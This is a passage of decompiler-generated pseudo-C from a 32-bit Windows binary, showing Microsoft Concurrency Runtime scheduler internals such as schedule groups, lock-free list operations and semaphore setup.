  }
  v6 = *(_DWORD *)(v1 + 44);
  v62 = -1;
  *(_DWORD *)(v1 + 28) = v2;
  *(_DWORD *)(v1 + 36) = unknown_libname_45((unsigned __int64)v6 >> 30 != 0 ? -1 : 4 * v6);
  *(_DWORD *)(v1 + 32) = unknown_libname_45((unsigned __int64)*(unsigned int *)(v1 + 44) >> 30 != 0 ? -1 : 4 * *(_DWORD *)(v1 + 44));
  memset(*(void **)(v1 + 36), 0, 4 * *(_DWORD *)(v1 + 44));
  memset(*(void **)(v1 + 32), 0, 4 * *(_DWORD *)(v1 + 44));
  v7 = (*(int (__thiscall **)(int))(*(_DWORD *)v1 + 36))(v1);
  v8 = 0;
  *(_DWORD *)(v1 + 176) = v7;
  v60 = 0;
  v54 = 0;
  *(_BYTE *)(v7 + 48) |= 4u;
  v9 = 0;
  for ( i = sub_43268F(); v9 < *(_DWORD *)(v1 + 40); v8 += 16 )
  {
    sub_4363A8((void *)(v8 + *(_DWORD *)(v1 + 28)), *(_DWORD *)(v1 + 44));
    sub_4363A8((void *)(v8 + *(_DWORD *)(v1 + 28) + 8), i);
    ++v9;
  }
  v10 = (_DWORD *)(*(int (__thiscall **)(_DWORD))(**(_DWORD **)(v1 + 424) + 16))(*(_DWORD *)(v1 + 424));
  v61 = v10;
  if ( v10 )
  {
    v11 = v60;
    do
    {
      sub_4347C5(&v44, i);
      v12 = *v10;
      v62 = 1;
      v58 = (*(int (__thiscall **)(_DWORD *))(v12 + 4))(v61);
      v13 = (*(int (__thiscall **)(_DWORD *))(*v61 + 8))(v61);
      v14 = *(_DWORD *)(v1 + 28);
      v50 = (char *)v13;
      v51 = (void *)(16 * v13);
      v52 = v11;
      *(_DWORD *)(*(_DWORD *)(v14 + 16 * v13 + 4) + 4 * (v58 >> 5)) |= 1 << (v58 & 0x1F);
      v53 = (int *)(*(int (__thiscall **)(_DWORD *))(*v61 + 16))(v61);
      v15 = (int)v53;
      v59 = v53;
      if ( v53 )
      {
        do
        {
          v55 = (*(int (__thiscall **)(int *))(*(_DWORD *)v15 + 4))(v59);
          sub_436998((unsigned int *)(v1 + 348), &v55, &v58);
          sub_436998((unsigned int *)(v1 + 360), &v55, &v54);
          v16 = v11 >> 5;
          v17 = v60 & 0x1F;
          *((_DWORD *)Block + v16) |= 1 << (v60 & 0x1F);
          v18 = *(_DWORD *)((char *)v51 + *(_DWORD *)(v1 + 28) + 12);
          *(_DWORD *)(v18 + 4 * v16) |= 1 << v17;
          v11 = v60 + 1;
          v60 = v11;
          v19 = (int (__thiscall **)(int *))*v59;
          v54 = v11;
          v15 = (*v19)(v59);
          v59 = (int *)v15;
        }
        while ( v15 );
      }
      v20 = (union _SLIST_HEADER *)operator new(0xC0u);
      v47 = v20;
      LOBYTE(v62) = 2;
      if ( v20 )
      {
        v21 = (int *)sub_43F3E4(v20, v1, (struct _SINGLE_LIST_ENTRY *)v58);
        v59 = v21;
      }
      else
      {
        v21 = 0;
        v59 = 0;
      }
      LOBYTE(v62) = 1;
      v22 = operator new(0x88u);
      v46 = v22;
      LOBYTE(v62) = 3;
      if ( v22 )
        v23 = sub_43D630((char *)v22, (int)&v44, (int)v50, v21);
      else
        v23 = 0;
      v24 = v53 == 0;
      v51 = v23;
      LOBYTE(v62) = 1;
      v21[1] = (int)v23;
      if ( !v24 )
      {
        v25 = (int)v53;
        v50 = v23 + 16;
        v26 = (unsigned int *)(v23 + 16);
        do
        {
          v49 = v52++;
          v48 = (*(int (__thiscall **)(int))(*(_DWORD *)v25 + 4))(v25);
          sub_436998(v26, &v48, &v49);
          v25 = (**(int (__thiscall ***)(int))v25)(v25);
        }
        while ( v25 );
        v1 = (int)v57;
        v11 = v60;
        v21 = v59;
      }
      v27 = v58;
      v28 = v51;
      *(_DWORD *)(*(_DWORD *)(v1 + 36) + 4 * v58) = v21;
      *(_DWORD *)(*(_DWORD *)(v1 + 32) + 4 * v27) = v28;
      v29 = (*(int (__thiscall **)(_DWORD *))*v61)(v61);
      v62 = -1;
      v10 = (_DWORD *)v29;
      v61 = (_DWORD *)v29;
      j_j_j___free_base(Block);
    }
    while ( v10 );
  }
  v30 = v60;
  sub_436427((void **)(v1 + 60), v60);
  sub_436427((void **)(v1 + 72), v30);
  sub_4363A8((void *)(v1 + 84), v30);
  sub_436427((void **)(v1 + 48), v30);
  v31 = 32 * v30;
  v32 = unknown_libname_45((unsigned __int64)v31 >> 30 != 0 ? -1 : 4 * v31);
  v33 = 0;
  for ( *(_DWORD *)(v1 + 92) = v32; v33 < v31; ++v33 )
    *(_DWORD *)(*(_DWORD *)(v1 + 92) + 4 * v33) = 0;
  v34 = *(_DWORD *)(v1 + 424);
  v35 = *(int (__thiscall **)(int, int, int))(*(_DWORD *)v34 + 8);
  v36 = (*(int (__thiscall **)(_DWORD *))(*v57 + 52))(v57);
  v37 = (void (__thiscall ***)(_DWORD, _DWORD))v35(v34, v36, 0x10000);
  v38 = v57;
  v57[107] = v37;
  (**v37)(v37, 0);
  v38[94] = sub_436385(v38, 0);
  Semaphore = __crtCreateSemaphoreExW(0, 0, 0x7FFFFFFF, 0, 0, 2031619);
  v38[95] = Semaphore;
  if ( !Semaphore )
  {
    LastError = GetLastError();
    if ( LastError > 0 )
      LastError = (unsigned __int16)LastError | 0x80070000;
    sub_43065D(pExceptionObject, LastError);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVscheduler_resource_allocation_error_Concurrency__);
  }
  (*(void (__thiscall **)(_DWORD *))(*v38 + 76))(v38);
  return sub_437E96(1, 4u, v38[93]);
}
// 436508: variable 'v42' is possibly undefined
// 42BFE2: using guessed type _DWORD __cdecl __crtCreateSemaphoreExW(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 42D1CA: using guessed type int __cdecl unknown_libname_45(_DWORD);
// 432694: using guessed type int sub_432694(void);
// 4364DE: using guessed type _DWORD pExceptionObject[4];

//----- (00436990) --------------------------------------------------------
void __thiscall sub_436990(volatile signed __int32 *this)
{
  _InterlockedIncrement(this + 98);
}

//----- (00436998) --------------------------------------------------------
_DWORD *__thiscall sub_436998(unsigned int *this, _DWORD *a2, _DWORD *a3)
{
  int v4; // ebx
  _DWORD *v5; // eax
  _DWORD *v6; // edx
  _DWORD *result; // eax

  v4 = sub_4364AB((int)a2, *this);
  if ( sub_436C0C(this, a2, v4) )
    return 0;
  v5 = operator new(0xCu);
  v6 = v5;
  if ( v5 )
  {
    *v5 = 0;
    v5[1] = *a2;
    v5[2] = *a3;
  }
  else
  {
    v6 = 0;
  }
  result = v6;
  *v6 = *(_DWORD *)(this[2] + 4 * v4);
  *(_DWORD *)(this[2] + 4 * v4) = v6;
  ++this[1];
  return result;
}

//----- (00436A00) --------------------------------------------------------
int *__thiscall sub_436A00(int this, _DWORD *a2)
{
  _DWORD *v3; // ebx
  PSLIST_ENTRY v4; // eax
  int *v5; // esi
  int *v6; // eax
  int v8[4]; // [esp+10h] [ebp-20h] BYREF
  void *Block; // [esp+20h] [ebp-10h]
  int v10; // [esp+2Ch] [ebp-4h]

  v3 = (_DWORD *)(this + 96);
  v4 = InterlockedPopEntrySList((PSLIST_HEADER)(this + 96));
  v5 = 0;
  if ( v4 )
    v5 = (int *)&v4[-13];
  if ( *(_DWORD *)(this + 12) )
  {
    memset(v8, 0, sizeof(v8));
    if ( v5 )
    {
      sub_4402D3(v5, v8);
      goto LABEL_14;
    }
    v5 = (int *)operator new(0x3Cu);
    Block = v5;
    v10 = 1;
    if ( v5 )
    {
      sub_43F70F((int)v5, this, v8);
      v5[14] = 0;
      *v5 = (int)&Concurrency::details::FairScheduleGroup::`vftable';
      *((_BYTE *)v5 + 48) = 2;
      goto LABEL_12;
    }
LABEL_11:
    v5 = 0;
    goto LABEL_12;
  }
  if ( !v5 )
  {
    v6 = (int *)operator new(0x38u);
    v5 = v6;
    Block = v6;
    v10 = 0;
    if ( v6 )
    {
      sub_43F70F((int)v6, this, a2);
      *v5 = (int)&Concurrency::details::CacheLocalScheduleGroup::`vftable';
      *((_BYTE *)v5 + 48) = 1;
LABEL_12:
      v10 = -1;
      goto LABEL_14;
    }
    goto LABEL_11;
  }
  sub_4402D3(v5, a2);
LABEL_14:
  sub_434FEC(v3, (signed __int32)v5);
  return v5;
}
// 471064: using guessed type void *Concurrency::details::CacheLocalScheduleGroup::`vftable';
// 4710A4: using guessed type void *Concurrency::details::FairScheduleGroup::`vftable';

//----- (00436AC6) --------------------------------------------------------
signed __int32 __thiscall sub_436AC6(void *this)
{
  signed __int32 v2; // ebx

  if ( (*((_BYTE *)this + 48) & 4) != 0 )
    return 0;
  v2 = _InterlockedDecrement((volatile signed __int32 *)this + 5);
  if ( !v2 )
  {
    (*(void (__thiscall **)(void *))(*(_DWORD *)this + 28))(this);
    sub_437682(*((union _SLIST_HEADER **)this + 1), (int)this);
  }
  return v2;
}

//----- (00436B00) --------------------------------------------------------
bool __thiscall sub_436B00(_DWORD *this, int a2)
{
  int v2; // eax
  unsigned int v3; // esi
  unsigned int v4; // edx

  v2 = 0;
  v3 = 0;
  v4 = (unsigned int)(*this + 31) >> 5;
  if ( v4 )
  {
    do
    {
      if ( v2 )
        break;
      v2 = *(_DWORD *)(*(_DWORD *)(a2 + 4) + 4 * v3) & *(_DWORD *)(this[1] + 4 * v3);
      ++v3;
    }
    while ( v3 < v4 );
  }
  return v2 != 0;
}

//----- (00436B3C) --------------------------------------------------------
int __thiscall sub_436B3C(int (__cdecl **this)(int), int (__cdecl *a2)(int), int (__cdecl *a3)(int), int a4)
{
  if ( (*(_DWORD *)(a4 + 404) & 0x20000000) != 0 )
    return a2((int)a3);
  *this = a2;
  this[1] = a3;
  return sub_436B78(a4, (int)this);
}

//----- (00436B78) --------------------------------------------------------
int __thiscall sub_436B78(int this, int a2)
{
  _DWORD *v3; // edi

  v3 = (_DWORD *)(this + 324);
  sub_4304D3((volatile __int32 *)(this + 324));
  *(_DWORD *)(a2 + 8) = sub_436FE7((volatile signed __int32 *)this);
  *(_DWORD *)(a2 + 12) = 0;
  **(_DWORD **)(this + 320) = a2;
  *(_DWORD *)(this + 320) = a2 + 12;
  return sub_430514(v3);
}

//----- (00436BBC) --------------------------------------------------------
char __thiscall sub_436BBC(_DWORD *this)
{
  char v1; // dl

  v1 = 0;
  if ( this[6] || this[2] != this[4] || this[3] != this[5] )
    return 1;
  return v1;
}

//----- (00436BD8) --------------------------------------------------------
bool __thiscall sub_436BD8(unsigned int *this, _DWORD *a2)
{
  bool v3; // bl
  void *v5[2]; // [esp+8h] [ebp-8h] BYREF

  sub_435E59(this, v5, a2);
  v3 = sub_436B00(v5, (int)(this + 12));
  j_j_j___free_base(v5[1]);
  return v3;
}

//----- (00436C0C) --------------------------------------------------------
_DWORD *__thiscall sub_436C0C(_DWORD *this, _DWORD *a2, int a3)
{
  _DWORD *v3; // ecx

  v3 = *(_DWORD **)(this[2] + 4 * a3);
  if ( !v3 )
    return 0;
  while ( v3[1] != *a2 )
  {
    v3 = (_DWORD *)*v3;
    if ( !v3 )
      return 0;
  }
  return v3;
}

//----- (00436C36) --------------------------------------------------------
_DWORD *__stdcall sub_436C36(_DWORD *a1, int a2, int a3, int a4)
{
  _DWORD *result; // eax

  result = a1;
  *a1 = 0;
  a1[1] = 0;
  return result;
}

//----- (00436C47) --------------------------------------------------------
char __thiscall sub_436C47(_DWORD *this, _DWORD *a2)
{
  if ( *a2 == this[84] )
    return 0;
  *a2 = this[84];
  return 1;
}

//----- (00436C69) --------------------------------------------------------
char __thiscall sub_436C69(int this, struct _SINGLE_LIST_ENTRY *a2)
{
  __int32 v4[3]; // [esp+8h] [ebp-Ch] BYREF

  v4[0] = 0;
  if ( sub_435C54((unsigned int *)this, v4, 0, 0, 0, 0, 12) )
  {
    if ( v4[0] == 2 || v4[0] == 8 )
    {
      InterlockedPushEntrySList((PSLIST_HEADER)(this + 512), a2 + 2);
      sub_43CCA4((_DWORD **)v4[1], v4[0], 0, 0);
    }
    else
    {
      sub_43CD35((int)v4, a2);
    }
    return 1;
  }
  else
  {
    InterlockedPushEntrySList((PSLIST_HEADER)(this + 512), a2 + 2);
    return 0;
  }
}

//----- (00436CF1) --------------------------------------------------------
DWORD sub_436CF1()
{
  sub_42E88A();
  dword_4927F0 = sub_430139();
  return sub_441369();
}
// 42E88A: using guessed type int sub_42E88A(void);

//----- (00436D05) --------------------------------------------------------
BOOL sub_436D05()
{
  BOOL result; // eax

  sub_4413AB();
  result = sub_430176(dword_4927F0);
  dword_4927F0 = 0;
  return result;
}

//----- (00436D1E) --------------------------------------------------------
void __thiscall sub_436D1E(_DWORD *this, signed __int64 a2)
{
  volatile signed __int64 *v2; // edi
  unsigned int v3; // esi
  signed __int64 v4; // rax
  _DWORD *v5; // edi
  signed int v6; // esi
  _DWORD *v7; // ebx
  int v8; // eax
  int v9; // eax
  _DWORD *v10; // ebx
  int v11; // eax
  volatile signed __int32 *v12; // [esp+Ch] [ebp-14h]
  int v13; // [esp+10h] [ebp-10h] BYREF
  _DWORD *v14; // [esp+14h] [ebp-Ch]
  int v15; // [esp+18h] [ebp-8h] BYREF
  unsigned int v16; // [esp+1Ch] [ebp-4h]

  v14 = this;
  v2 = (volatile signed __int64 *)(this + 104);
  do
  {
    v3 = *(_DWORD *)v2;
    LODWORD(v4) = *(_DWORD *)v2;
    v16 = this[105];
    HIDWORD(v4) = v16;
  }
  while ( _InterlockedCompareExchange64(v2, a2, v4) != __PAIR64__(v16, v3) );
  v5 = v14;
  v12 = v14 + 77;
  sub_42E793(v14 + 77);
  v6 = 0;
  v16 = 0;
  if ( (int)v14[11] > 0 )
  {
    do
    {
      v7 = *(_DWORD **)(v5[9] + 4 * v6);
      v14 = *(_DWORD **)(v5[8] + 4 * v6);
      v8 = sub_435BFA(0, v7[20], &v15, v7 + 4);
      if ( v8 )
      {
        do
        {
          if ( (unsigned int)(a2 - *(_DWORD *)(v8 + 264)) > 0x7D0 && *(_DWORD *)(v8 + 284) == 1 )
          {
            *(_DWORD *)(v8 + 284) = 2;
            sub_435179(v5 + 76, v8 + 272);
          }
          v8 = sub_43618B(&v15, 0, v7 + 4);
        }
        while ( v8 );
        v6 = v16;
      }
      v9 = sub_435BFA(0, v7[40], &v15, v7 + 24);
      if ( v9 )
      {
        do
        {
          if ( (unsigned int)(a2 - *(_DWORD *)(v9 + 264)) > 0x7D0 && *(_DWORD *)(v9 + 284) == 1 )
          {
            *(_DWORD *)(v9 + 284) = 2;
            sub_435179(v5 + 76, v9 + 272);
          }
          v9 = sub_43618B(&v15, 0, v7 + 24);
        }
        while ( v9 );
        v6 = v16;
      }
      v10 = v14;
      v11 = sub_435C25(v14, 0, v14[30], &v13);
      if ( v11 )
      {
        do
        {
          if ( (unsigned int)(a2 - *(_DWORD *)(v11 + 200)) > 0x7D0 && *(_DWORD *)(v11 + 224) == 1 )
          {
            *(_DWORD *)(v11 + 224) = 2;
            sub_435179(v5 + 76, v11 + 212);
          }
          v11 = sub_436233(v10, &v13, 0);
        }
        while ( v11 );
        v6 = v16;
      }
      v16 = ++v6;
    }
    while ( v6 < v5[11] );
  }
  sub_42E8AD(v12);
}

//----- (00436ED4) --------------------------------------------------------
int __thiscall sub_436ED4(int this)
{
  signed __int32 v2; // edx
  signed __int32 v3; // ecx
  signed __int32 i; // eax

  if ( dword_4927E8 == this )
  {
    sub_4304E3(&dword_492814);
    dword_4927E8 = this != dword_4927E8 ? dword_4927E8 : 0;
    dword_492814 = 0;
  }
  if ( *(int *)(this + 392) > 1 )
  {
    v2 = *(_DWORD *)(this + 404);
    v3 = v2;
    for ( i = v2; ; v3 = i )
    {
      i = _InterlockedCompareExchange((volatile signed __int32 *)(this + 404), v3 | 0x80000000, i);
      if ( i == v2 )
        break;
      v2 = i;
    }
    if ( (v2 & 0x1FFFFFFF) == 0 )
      sub_4353E1((volatile signed __int32 *)this);
  }
  return sub_43588D(this);
}
// 4927E8: using guessed type int dword_4927E8;
// 492814: using guessed type int dword_492814;

//----- (00436F4A) --------------------------------------------------------
int __thiscall sub_436F4A(int this)
{
  _BYTE *v2; // eax
  char v3; // bl
  signed __int32 v4; // eax
  signed __int32 v5; // edx
  int result; // eax

  v2 = sub_430184(dword_4927F0);
  if ( v2 && !v2[76] && sub_41DA3D(v2) == this )
  {
    v3 = 0;
  }
  else
  {
    v3 = 1;
    _InterlockedIncrement((volatile signed __int32 *)(this + 392));
  }
  sub_4356AC((int *)this, 0);
  (*(void (__thiscall **)(int))(*(_DWORD *)this + 84))(this);
  v4 = *(_DWORD *)(this + 404);
  do
  {
    v5 = v4;
    v4 = _InterlockedCompareExchange((volatile signed __int32 *)(this + 404), v4 & 0x9FFFFFFF | 0x20000000, v4);
  }
  while ( v4 != v5 );
  sub_437384((HANDLE *)this, v4 & 0x1FFFFFFF);
  result = (*(int (__thiscall **)(int))(*(_DWORD *)this + 80))(this);
  if ( v3 )
    return sub_43588D(this);
  return result;
}

//----- (00436FE7) --------------------------------------------------------
signed __int32 __thiscall sub_436FE7(volatile signed __int32 *this)
{
  volatile signed __int32 *v1; // ecx
  signed __int32 result; // eax

  v1 = this + 84;
  do
  {
    do
      result = _InterlockedIncrement(v1);
    while ( !result );
  }
  while ( result == -1 );
  return result;
}

//----- (00436FFF) --------------------------------------------------------
signed __int32 __thiscall sub_436FFF(volatile signed __int32 *this, volatile signed __int32 *a2)
{
  signed __int32 v2; // esi
  signed __int32 result; // eax

  do
  {
    v2 = *this;
    *a2 = *this;
    result = _InterlockedCompareExchange(this, (signed __int32)a2, v2);
  }
  while ( result != v2 );
  return result;
}

//----- (0043701D) --------------------------------------------------------
char __thiscall sub_43701D(unsigned int *this, struct _SINGLE_LIST_ENTRY *a2, int a3, int a4, int a5, int a6)
{
  char v6; // bl
  int v8[4]; // [esp-14h] [ebp-30h] BYREF
  int v9; // [esp-4h] [ebp-20h]
  __int32 v10[3]; // [esp+Ch] [ebp-10h] BYREF
  unsigned int *v11; // [esp+18h] [ebp-4h]

  v11 = this;
  v6 = 0;
  if ( sub_430184(dword_4927F0) != (LPVOID)(a2 != 0 ? (unsigned int)&a2[1] : 0) )
  {
    sub_438FB0();
    v9 = 5;
    v10[0] = 0;
    sub_4380FD(v8, &a3);
    if ( sub_435C54(v11, v10, v8[0], v8[1], v8[2], v8[3], v9) )
    {
      sub_43CD35((int)v10, a2);
      v6 = 1;
    }
    sub_438FB0();
  }
  return v6;
}
// 438FB0: using guessed type int sub_438FB0(void);

//----- (0043708A) --------------------------------------------------------
int __thiscall sub_43708A(void **this, void *a2)
{
  int result; // eax

  j_j_j___free_base(this[1]);
  *this = a2;
  result = unknown_libname_45((unsigned __int64)(((unsigned int)a2 + 31) >> 5) >> 30 != 0 ? -1 : 4
                                                                                               * (((unsigned int)a2 + 31) >> 5));
  this[1] = (void *)result;
  return result;
}
// 42D1CA: using guessed type int __cdecl unknown_libname_45(_DWORD);

//----- (004370C1) --------------------------------------------------------
signed __int32 __thiscall sub_4370C1(int this)
{
  signed __int32 result; // eax

  result = 0;
  if ( (*(_BYTE *)(this + 48) & 4) == 0 )
    return _InterlockedIncrement((volatile signed __int32 *)(this + 20));
  return result;
}

//----- (004370D1) --------------------------------------------------------
signed __int32 __thiscall sub_4370D1(volatile signed __int32 *this)
{
  signed __int32 v2; // edi
  volatile __int32 *v3; // ecx
  _BYTE *v4; // eax
  char pExceptionObject[12]; // [esp+8h] [ebp-Ch] BYREF

  v2 = _InterlockedIncrement(this + 96);
  if ( v2 == 1 )
  {
    v3 = this + 99;
    if ( *((int *)this + 99) <= 0 )
    {
      _InterlockedExchange(v3, 1);
    }
    else
    {
      v4 = sub_430184(dword_4927F0);
      if ( !v4 || v4[76] || (volatile signed __int32 *)sub_41DA3D(v4) != this )
      {
        std::bad_function_call::bad_function_call((std::bad_function_call *)pExceptionObject);
        _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVimproper_scheduler_reference_Concurrency__);
      }
      sub_437798(this);
    }
  }
  return v2;
}

//----- (00437141) --------------------------------------------------------
int __thiscall sub_437141(volatile signed __int32 *this)
{
  _InterlockedIncrement(this + 97);
  return (*(int (__thiscall **)(volatile signed __int32 *))(*this + 16))(this);
}

//----- (00437160) --------------------------------------------------------
void __thiscall sub_437160(volatile signed __int32 *this, HANDLE hSourceHandle)
{
  HANDLE CurrentProcess; // esi
  HANDLE v4; // eax
  _DWORD *v5; // eax
  int LastError; // eax
  int v7; // [esp+4h] [ebp-14h] BYREF
  char pExceptionObject[12]; // [esp+8h] [ebp-10h] BYREF
  HANDLE TargetHandle; // [esp+14h] [ebp-4h] BYREF

  if ( !hSourceHandle || hSourceHandle == (HANDLE)-1 )
  {
    sub_429626((std::exception *)pExceptionObject, "eventObject");
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVinvalid_argument_std__);
  }
  TargetHandle = 0;
  CurrentProcess = GetCurrentProcess();
  v4 = GetCurrentProcess();
  if ( !DuplicateHandle(v4, hSourceHandle, CurrentProcess, &TargetHandle, 0, 0, 2u) )
  {
    LastError = GetLastError();
    if ( LastError > 0 )
      LastError = (unsigned __int16)LastError | 0x80070000;
    sub_43065D(&v7, LastError);
    _CxxThrowException(&v7, (_ThrowInfo *)&_TI2_AVscheduler_resource_allocation_error_Concurrency__);
  }
  v5 = operator new(0xCu);
  v5[2] = TargetHandle;
  sub_4351DA(this + 46, v5);
}

//----- (00437207) --------------------------------------------------------
signed __int32 __thiscall sub_437207(volatile signed __int32 *this)
{
  signed __int32 v1; // esi

  v1 = _InterlockedDecrement(this + 96);
  if ( !v1 )
    sub_436ED4((int)this);
  return v1;
}

//----- (0043721F) --------------------------------------------------------
PSLIST_ENTRY __thiscall sub_43721F(int this, struct _SINGLE_LIST_ENTRY *a2)
{
  union _SLIST_HEADER *v2; // edi

  v2 = (union _SLIST_HEADER *)(this + 496);
  if ( QueryDepthSList((PSLIST_HEADER)(this + 496)) >= *(int *)(this + 20) )
    return (PSLIST_ENTRY)sub_43459D((int)a2);
  sub_441093((int)a2);
  return InterlockedPushEntrySList(v2, a2 + 1);
}

//----- (00437261) --------------------------------------------------------
int __thiscall sub_437261(volatile signed __int32 *this)
{
  _InterlockedDecrement(this + 97);
  return (*(int (__thiscall **)(volatile signed __int32 *))(*this + 20))(this);
}

//----- (00437280) --------------------------------------------------------
PSLIST_ENTRY __thiscall sub_437280(int this, struct _SINGLE_LIST_ENTRY *a2, char a3)
{
  if ( a3 )
    (*(void (__thiscall **)(_DWORD, struct _SINGLE_LIST_ENTRY *))(**(_DWORD **)(this + 428) + 12))(
      *(_DWORD *)(this + 428),
      a2);
  _InterlockedDecrement((volatile signed __int32 *)(this + 400));
  return InterlockedPushEntrySList((PSLIST_HEADER)(this + 488), a2 + 2);
}

//----- (004372CA) --------------------------------------------------------
PSLIST_ENTRY __thiscall sub_4372CA(int this, int a2)
{
  union _SLIST_HEADER *v3; // edi
  int DepthSList; // edx
  PSLIST_ENTRY result; // eax

  v3 = (union _SLIST_HEADER *)(this + 504);
  DepthSList = QueryDepthSList((PSLIST_HEADER)(this + 504));
  result = (PSLIST_ENTRY)(32 * *(_DWORD *)(this + 20));
  if ( DepthSList < (int)result )
    return InterlockedPushEntrySList(v3, (PSLIST_ENTRY)(a2 + 12));
  if ( a2 )
    return (PSLIST_ENTRY)(**(int (__thiscall ***)(int, int))a2)(a2, 1);
  return result;
}

//----- (0043731A) --------------------------------------------------------
PSLIST_ENTRY __thiscall sub_43731A(union _SLIST_HEADER *this)
{
  union _SLIST_HEADER *v1; // esi
  PSLIST_ENTRY result; // eax
  struct _SINGLE_LIST_ENTRY *i; // ebx
  PSLIST_ENTRY v4; // ebx

  v1 = this;
  result = InterlockedPopEntrySList(this + 64);
  for ( i = result != 0 ? &result[-2] : 0; i; i = v4 != 0 ? &v4[-2] : 0 )
  {
    (*(void (__thiscall **)(_DWORD, struct _SINGLE_LIST_ENTRY *))(**(_DWORD **)&v1[53].Depth + 12))(
      *(_DWORD *)&v1[53].Depth,
      i);
    v1 = this;
    sub_437280((int)this, i, 0);
    v4 = InterlockedPopEntrySList(this + 64);
    result = v4 - 2;
  }
  return result;
}

//----- (00437384) --------------------------------------------------------
BOOL __thiscall sub_437384(HANDLE *this, LONG lReleaseCount)
{
  BOOL result; // eax

  if ( lReleaseCount > 0 )
    return ReleaseSemaphore(this[95], lReleaseCount, 0);
  return result;
}

//----- (004373A2) --------------------------------------------------------
int __thiscall sub_4373A2(int *this, int a2)
{
  int result; // eax

  *(_DWORD *)(*(_DWORD *)(a2 + 4) + 8) = *(_DWORD *)(a2 + 8);
  *(_DWORD *)(*(_DWORD *)(a2 + 8) + 4) = *(_DWORD *)(a2 + 4);
  result = *this;
  if ( a2 == *this )
  {
    if ( result == *(_DWORD *)(result + 4) )
      result = 0;
    else
      result = *(_DWORD *)(result + 8);
    *this = result;
  }
  return result;
}

//----- (004373D4) --------------------------------------------------------
char __thiscall sub_4373D4(PSLIST_HEADER ListHead, struct _SINGLE_LIST_ENTRY *a2, int a3, char a4)
{
  int v5; // edx
  int v6; // ebx
  struct _SINGLE_LIST_ENTRY *Next; // ecx
  int v8; // eax
  int v9; // edx
  int v10; // edi
  int v11; // edx
  USHORT DepthSList; // ax
  struct _SINGLE_LIST_ENTRY *v13; // eax
  struct _SINGLE_LIST_ENTRY *v15; // [esp-4h] [ebp-18h]
  int v16; // [esp-4h] [ebp-18h]

  v5 = a3 >> *(_DWORD *)&ListHead[5].Depth;
  v6 = a3 & ((int)&ListHead[5].Next.Next[-1].Next + 3);
  if ( v5 >= *(_DWORD *)&ListHead[7].Depth )
    return 0;
  Next = ListHead[7].Next.Next;
  v8 = *(_DWORD *)&ListHead[6].Depth;
  if ( v5 < (int)Next )
  {
    v10 = *(_DWORD *)(v8 + 4 * v5);
  }
  else
  {
    v9 = v5 - (_DWORD)Next;
    v10 = *(_DWORD *)(v8 + 4 * (_DWORD)Next - 4);
    if ( v9 >= 0 )
    {
      v11 = v9 + 1;
      do
      {
        v10 = *(_DWORD *)(v10 + 4);
        --v11;
      }
      while ( v11 );
    }
  }
  if ( (struct _SINGLE_LIST_ENTRY *)_InterlockedCompareExchange(
                                      (volatile signed __int32 *)(*(_DWORD *)v10 + 4 * v6),
                                      0,
                                      (signed __int32)a2) != a2 )
    return 0;
  _InterlockedCompareExchange((volatile signed __int32 *)(v10 + 8), v6, -2);
  if ( a4 )
  {
    DepthSList = QueryDepthSList(ListHead);
    v15 = a2 + 1;
    if ( DepthSList <= *(int *)&ListHead[8].Depth )
    {
      InterlockedPushEntrySList(ListHead, v15);
    }
    else
    {
      InterlockedPushEntrySList(ListHead + 1, v15);
      if ( QueryDepthSList(ListHead + 1) > *(int *)&ListHead[8].Depth
        && (*(_DWORD *)(*(_DWORD *)&ListHead[4].Depth + 404) & 0xA0000000) != -1610612736
        && !_InterlockedCompareExchange((volatile signed __int32 *)&ListHead[9], 1, 0) )
      {
        v13 = InterlockedFlushSList(ListHead + 1);
        v16 = *(_DWORD *)&ListHead[4].Depth;
        ListHead[2].Next.Next = v13;
        sub_436B3C(
          (int (__cdecl **)(int))&ListHead[2].Depth,
          (int (__cdecl *)(int))sub_435513,
          (int (__cdecl *)(int))ListHead,
          v16);
      }
    }
  }
  return 1;
}

//----- (004374CD) --------------------------------------------------------
char __thiscall sub_4374CD(PSLIST_HEADER ListHead, struct _SINGLE_LIST_ENTRY *a2, int a3, char a4)
{
  int v5; // edx
  int v6; // ebx
  struct _SINGLE_LIST_ENTRY *Next; // ecx
  int v8; // eax
  int v9; // edx
  int v10; // edi
  int v11; // edx
  USHORT DepthSList; // ax
  struct _SINGLE_LIST_ENTRY *v13; // eax
  struct _SINGLE_LIST_ENTRY *v15; // [esp-4h] [ebp-18h]
  int v16; // [esp-4h] [ebp-18h]

  v5 = a3 >> *(_DWORD *)&ListHead[5].Depth;
  v6 = a3 & ((int)&ListHead[5].Next.Next[-1].Next + 3);
  if ( v5 >= *(_DWORD *)&ListHead[7].Depth )
    return 0;
  Next = ListHead[7].Next.Next;
  v8 = *(_DWORD *)&ListHead[6].Depth;
  if ( v5 < (int)Next )
  {
    v10 = *(_DWORD *)(v8 + 4 * v5);
  }
  else
  {
    v9 = v5 - (_DWORD)Next;
    v10 = *(_DWORD *)(v8 + 4 * (_DWORD)Next - 4);
    if ( v9 >= 0 )
    {
      v11 = v9 + 1;
      do
      {
        v10 = *(_DWORD *)(v10 + 4);
        --v11;
      }
      while ( v11 );
    }
  }
  if ( (struct _SINGLE_LIST_ENTRY *)_InterlockedCompareExchange(
                                      (volatile signed __int32 *)(*(_DWORD *)v10 + 4 * v6),
                                      0,
                                      (signed __int32)a2) != a2 )
    return 0;
  _InterlockedCompareExchange((volatile signed __int32 *)(v10 + 8), v6, -2);
  if ( a4 )
  {
    DepthSList = QueryDepthSList(ListHead);
    v15 = a2 + 13;
    if ( DepthSList <= *(int *)&ListHead[8].Depth )
    {
      InterlockedPushEntrySList(ListHead, v15);
    }
    else
    {
      InterlockedPushEntrySList(ListHead + 1, v15);
      if ( QueryDepthSList(ListHead + 1) > *(int *)&ListHead[8].Depth
        && (*(_DWORD *)(*(_DWORD *)&ListHead[4].Depth + 404) & 0xA0000000) != -1610612736
        && !_InterlockedCompareExchange((volatile signed __int32 *)&ListHead[9], 1, 0) )
      {
        v13 = InterlockedFlushSList(ListHead + 1);
        v16 = *(_DWORD *)&ListHead[4].Depth;
        ListHead[2].Next.Next = v13;
        sub_436B3C(
          (int (__cdecl **)(int))&ListHead[2].Depth,
          (int (__cdecl *)(int))sub_43551F,
          (int (__cdecl *)(int))ListHead,
          v16);
      }
    }
  }
  return 1;
}

//----- (004375C6) --------------------------------------------------------
